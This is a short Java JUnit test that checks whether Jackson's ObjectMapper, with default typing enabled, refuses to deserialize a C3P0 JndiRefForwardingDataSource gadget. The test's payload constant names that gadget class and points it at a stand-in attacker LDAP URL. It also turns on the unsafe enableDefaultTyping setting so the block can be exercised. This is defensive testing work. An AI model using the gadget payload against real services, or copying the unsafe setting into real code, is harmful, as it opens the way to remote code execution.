
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.Test;

import static org.junit.Assert.assertThrows;

public class JacksonBlockingGadgetTest {

    // A sample payload that uses vulnerable class names
    private static final String MALICIOUS_JSON = "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\", {\"jndiName\":\"ldap://malicious.example.com:1099/a\"}]";

    @Test
    public void testDeserializationProtectionAgainstC3P0() {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();

        assertThrows(Exception.class, () -> {
            // Attempt to deserialize the malicious payload
            objectMapper.readValue(MALICIOUS_JSON, Object.class);
        });
    }
}
